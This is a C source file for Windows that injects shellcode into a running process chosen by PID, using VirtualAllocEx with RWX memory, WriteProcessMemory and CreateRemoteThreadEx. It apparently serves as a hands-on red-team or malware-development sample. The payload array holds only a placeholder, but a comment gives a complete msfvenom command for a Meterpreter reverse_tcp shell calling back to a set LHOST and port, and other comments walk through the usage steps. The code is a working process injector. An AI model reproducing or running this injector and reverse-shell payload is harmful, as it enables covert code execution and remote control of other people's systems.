#include <windows.h>
#include <stdio.h>


// list the PID you want to inject into via -> tasklist | findstr <process_name>
// run ShellcodeInjection.exe via           -> .\ShellcodeInjection.exe <PID>


// some status symbols for printf debug statments
const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

int main(int argc, char* argv[]) {

    // declare and initialize variables for later use
    PVOID rBuffer = NULL;
    DWORD dwPID = NULL;
    DWORD dwTID = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;

    // here goes our shellcode, which can be generated via msfvenom:
    // msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_tcp LHOST=192.168.178.82 LPORT=9001 EXITFUNC=thread -f c var_name=zekoHop
    unsigned char zekoHop[] =
        "\x41\x41\x41\x41";

    size_t zekoHopSize = sizeof(zekoHop);

    // provide file name and PID of the running process (e.g. notepad.exe -> PID=10960)
    if (argc < 2) {
        printf("%s usage: %s <PID>", e, argv[0]);
        return EXIT_FAILURE;
    }

    // convert from string to integer
    dwPID = atoi(argv[1]);

    printf("%s trying to get a handle to the process (%ld)\n", i, dwPID);

    // opens an existing process (e.g. notepad.exe)
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

    // process does not exist
    if (hProcess == NULL) {
        printf("%s failed to get a handle to the process, error: 0x%lx", e, GetLastError());
        return EXIT_FAILURE;
    }

    // process exists
    printf("%s got a handle to the process\n\\---0x%p\n", k, hProcess);

    // allocate virtual address space of a specific process in memory
    rBuffer = VirtualAllocEx(hProcess, NULL, zekoHopSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    printf("%s allocated %zd-bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", k, zekoHopSize);

    if (rBuffer == NULL) {
        printf("%s failed to allocate buffer, error: 0x%lx", e, GetLastError());
        return EXIT_FAILURE;
    }

    // write data (here: our shellcode "zekoHop") into an area of memory in a specified process
    WriteProcessMemory(hProcess, rBuffer, zekoHop, zekoHopSize, NULL);
    printf("%s wrote %zd-bytes to allocated buffer\n", k, zekoHopSize);

    // create thread to run our payload
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);

    if (hThread == NULL) {
        printf("%s failed to get a handle to the new thread, error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the newly-created thread (%ld)\n\\---0x%p\n", k, dwTID, hProcess);

    printf("%s waiting for thread to finish executing\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing, cleaning up\n", k);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s finished, see you next time :>", k);

    return EXIT_SUCCESS;

}
